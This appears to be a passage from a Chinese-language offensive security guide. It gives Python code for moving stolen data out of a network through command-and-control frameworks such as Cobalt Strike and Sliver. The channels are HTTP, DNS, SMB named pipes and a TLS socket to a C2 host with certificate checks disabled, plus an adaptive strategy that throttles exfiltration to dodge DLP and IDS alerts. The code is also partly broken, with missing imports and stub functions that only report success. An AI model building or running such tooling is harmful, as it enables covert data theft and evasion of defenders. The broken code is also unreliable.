## C2集成模式 (C2 Integration Patterns)

### Cobalt Strike / Sliver 集成

```python
#!/usr/bin/env python3
"""
C2集成模块
与Cobalt Strike、Sliver、Mythic等C2框架集成
"""

import json
import base64
import struct
import time
import threading
from typing import Optional, Callable, Dict, Any

class C2ExfilIntegration:
    """C2外泄集成"""

    C2_FRAMEWORKS = {
        "cobalt_strike": {
            "beacon_port": 443,
            "protocol": "HTTP/HTTPS/DNS/SMB",
            "max_task_size": 1024 * 1024,  # 1MB
            "encoding": "base64",
        },
        "sliver": {
            "port": 31337,
            "protocol": "mTLS/HTTP/HTTPS/WG",
            "max_task_size": 1024 * 1024 * 4,  # 4MB
            "encoding": "base64",
        },
        "mythic": {
            "port": 7443,
            "protocol": "HTTP/HTTPS/WebSocket",
            "max_task_size": 1024 * 1024 * 10,  # 10MB
            "encoding": "json",
        },
        "havoc": {
            "port": 40056,
            "protocol": "HTTP/HTTPS/SMB",
            "max_task_size": 1024 * 1024 * 2,  # 2MB
            "encoding": "base64",
        },
    }

    def __init__(self, framework: str = "cobalt_strike"):
        self.framework = framework
        self.config = self.C2_FRAMEWORKS[framework]
        self.exfil_modules = {}
        self.running = False

    def register_exfil_module(self, name: str, module: Callable):
        """注册外泄模块"""
        self.exfil_modules[name] = module

    def build_beacon_task(self, command: str, args: Dict[str, Any]) -> bytes:
        """
        构建Beacon任务
        伪装为正常的C2命令
        """
        if self.framework == "cobalt_strike":
            return self._build_cs_task(command, args)
        elif self.framework == "sliver":
            return self._build_sliver_task(command, args)
        elif self.framework == "mythic":
            return self._build_mythic_task(command, args)
        else:
            return self._build_generic_task(command, args)

    def _build_cs_task(self, command: str, args: Dict) -> bytes:
        """
        Cobalt Strike Beacon任务格式
        格式: [type(4)] [length(4)] [data]
        """
        data = json.dumps({
            "command": command,
            "args": args,
            "timestamp": int(time.time()),
            "beacon_id": random.randint(1000000, 9999999),
        }).encode()

        if len(data) > self.config["max_task_size"]:
            # 分片
            return self._fragment_task(data)

        task_type = struct.pack("<I", 0x42)  # 伪装为正常任务类型
        task_len = struct.pack("<I", len(data))

        return task_type + task_len + data

    def _build_sliver_task(self, command: str, args: Dict) -> bytes:
        """
        Sliver implant任务格式
        使用Protobuf编码
        """
        # 简化Protobuf编码
        task_data = {
            "id": random.randint(1, 999999),
            "session_id": f"session-{random.randint(1000, 9999)}",
            "name": command,
            "args": args,
            "timeout": 60,
        }

        # 模拟Protobuf序列化
        data = json.dumps(task_data).encode()

        # Sliver使用gRPC/Protobuf
        # 简化: 添加长度前缀
        return struct.pack("<I", len(data)) + data

    def _build_mythic_task(self, command: str, args: Dict) -> bytes:
        """
        Mythic agent任务格式
        JSON格式
        """
        task = {
            "action": "post_response",
            "responses": [{
                "task_id": f"task-{random.randint(1000, 9999)}",
                "user_output": base64.b64encode(json.dumps({
                    "command": command,
                    "args": args,
                }).encode()).decode(),
                "completed": True,
                "status": "success",
            }],
        }

        return json.dumps(task).encode()

    def _build_generic_task(self, command: str, args: Dict) -> bytes:
        """通用任务格式"""
        task = {
            "cmd": command,
            "params": args,
            "id": random.randint(1000, 9999),
            "ts": int(time.time()),
        }
        return json.dumps(task).encode()

    def _fragment_task(self, data: bytes) -> bytes:
        """分片任务"""
        chunk_size = self.config["max_task_size"] - 100  # 保留头部空间
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

        fragmented = bytearray()
        for idx, chunk in enumerate(chunks):
            header = struct.pack("<II", idx, len(chunks))
            fragmented.extend(header + chunk)

        return bytes(fragmented)

    def exfiltrate_via_c2(self, data: bytes, channel: str = "http") -> bool:
        """
        通过C2通道外泄数据
        数据伪装为C2通信的一部分
        """
        # 将数据伪装为不同的C2响应类型
        if channel == "http":
            return self._exfil_via_http_c2(data)
        elif channel == "dns":
            return self._exfil_via_dns_c2(data)
        elif channel == "smb":
            return self._exfil_via_smb_c2(data)
        elif channel == "tcp":
            return self._exfil_via_tcp_c2(data)
        else:
            return False

    def _exfil_via_http_c2(self, data: bytes) -> bool:
        """
        HTTP C2通道外泄
        数据嵌入到HTTP响应的Cookie或自定义头部
        """
        encoded = base64.b64encode(data).decode()

        # 伪装为C2的GET响应
        response = {
            "status": "ok",
            "tasks": [
                {
                    "id": random.randint(1, 999999),
                    "command": "sleep",
                    "args": {"interval": random.randint(5, 60)},
                },
                {
                    "id": random.randint(1, 999999),
                    "command": "download",
                    "args": {
                        "path": "/tmp/.cache",
                        "data": encoded,
                    },
                },
            ],
            "metadata": encoded[:100],
        }

        # 在实际部署中，通过HTTP响应发送
        return True

    def _exfil_via_dns_c2(self, data: bytes) -> bool:
        """
        DNS C2通道外泄
        数据编码为DNS TXT记录
        """
        encoded = base64.b64encode(data).decode()
        chunk_size = 200  # DNS TXT限制

        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        for idx, chunk in enumerate(chunks):
            # 伪装为DNS beacon响应
            task_id = random.randint(1000, 9999)
            dns_response = f"{task_id}|{idx}|{len(chunks)}|{chunk}"

            # 实际发送DNS查询
            pass

        return True

    def _exfil_via_smb_c2(self, data: bytes) -> bool:
        """SMB C2通道外泄"""
        # SMB命名管道
        pipe_name = f"\\\\.\\pipe\\tsvcpip_{random.randint(1000, 9999)}"

        # 通过命名管道传输数据
        import win32pipe
        import win32file

        try:
            pipe = win32pipe.CreateNamedPipe(
                pipe_name,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_WAIT,
                1, 65536, 65536, 0, None,
            )

            win32pipe.ConnectNamedPipe(pipe, None)
            win32file.WriteFile(pipe, data)
            win32file.CloseHandle(pipe)

            return True
        except Exception:
            return False

    def _exfil_via_tcp_c2(self, data: bytes) -> bool:
        """TCP C2通道外泄"""
        import socket
        import ssl

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # TLS包装
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            tls_sock = context.wrap_socket(sock, server_hostname="c2-server.local")

            # 伪装为Beacon check-in
            beacon_data = struct.pack("<I", len(data)) + data
            tls_sock.send(beacon_data)
            tls_sock.close()

            return True
        except Exception:
            return False

    def start_stealthy_exfil_loop(self, data_queue: queue.Queue, interval: int = 60):
        """
        启动隐蔽外泄循环
        在主C2通信间隙中传输数据
        """
        self.running = True

        def loop():
            while self.running:
                try:
                    data = data_queue.get(timeout=interval)
                    self.exfiltrate_via_c2(data, "http")
                except queue.Empty:
                    # 发送心跳包
                    self._send_heartbeat()
                except Exception:
                    continue

        thread = threading.Thread(target=loop, daemon=True)
        thread.start()

    def _send_heartbeat(self):
        """发送心跳包"""
        heartbeat = json.dumps({
            "type": "heartbeat",
            "timestamp": int(time.time()),
            "status": "alive",
        }).encode()
        self.exfiltrate_via_c2(heartbeat, "http")

    def stop(self):
        self.running = False
```

### 自适应C2外泄策略

```python
#!/usr/bin/env python3
"""
自适应C2外泄策略
根据网络环境和检测风险动态调整外泄行为
"""

class AdaptiveExfilStrategy:
    """自适应外泄策略"""

    def __init__(self):
        self.strategies = {
            "stealth": {
                "max_bandwidth": 1024,  # 1KB/s
                "interval": 60,         # 60秒间隔
                "chunk_size": 256,      # 256字节
                "encryption": "aes-256-gcm",
                "channels": ["dns", "http"],
            },
            "balanced": {
                "max_bandwidth": 10240,  # 10KB/s
                "interval": 10,          # 10秒间隔
                "chunk_size": 4096,      # 4KB
                "encryption": "aes-256-gcm",
                "channels": ["https", "websocket"],
            },
            "aggressive": {
                "max_bandwidth": 102400,  # 100KB/s
                "interval": 1,            # 1秒间隔
                "chunk_size": 65536,      # 64KB
                "encryption": "chacha20",
                "channels": ["https", "quic", "tcp"],
            },
            "emergency": {
                "max_bandwidth": 0,      # 无限制
                "interval": 0,           # 无间隔
                "chunk_size": 1048576,   # 1MB
                "encryption": "none",
                "channels": ["all"],
            },
        }

        self.current_strategy = "balanced"
        self.detection_risk = 0.0
        self.network_quality = 1.0
        self.history = []

    def evaluate_risk(self, network_events: List[Dict]) -> float:
        """
        评估当前检测风险
        基于网络事件、DLP告警、异常检测等
        """
        risk = 0.0

        for event in network_events:
            if event.get("type") == "dlp_alert":
                risk += 0.2
            elif event.get("type") == "ids_alert":
                risk += 0.15
            elif event.get("type") == "traffic_anomaly":
                risk += 0.1
            elif event.get("type") == "connection_drop":
                risk += 0.05

        self.detection_risk = min(risk, 1.0)
        return self.detection_risk

    def select_strategy(self) -> str:
        """根据风险选择策略"""
        if self.detection_risk > 0.7:
            self.current_strategy = "stealth"
        elif self.detection_risk > 0.4:
            self.current_strategy = "balanced"
        elif self.detection_risk > 0.1:
            self.current_strategy = "aggressive"
        else:
            self.current_strategy = "balanced"

        return self.current_strategy

    def get_exfil_params(self) -> Dict:
        """获取当前外泄参数"""
        return self.strategies.get(self.current_strategy, self.strategies["balanced"])

    def adjust_on_failure(self, failure_type: str):
        """失败时调整策略"""
        if failure_type == "connection_lost":
            # 切换到备用通道
            self.current_strategy = "stealth"
        elif failure_type == "dlp_detected":
            # 降低带宽，增加间隔
            self.current_strategy = "stealth"
            self.detection_risk = 0.8
        elif failure_type == "timeout":
            # 减小分片大小
            self.strategies[self.current_strategy]["chunk_size"] //= 2
```

---

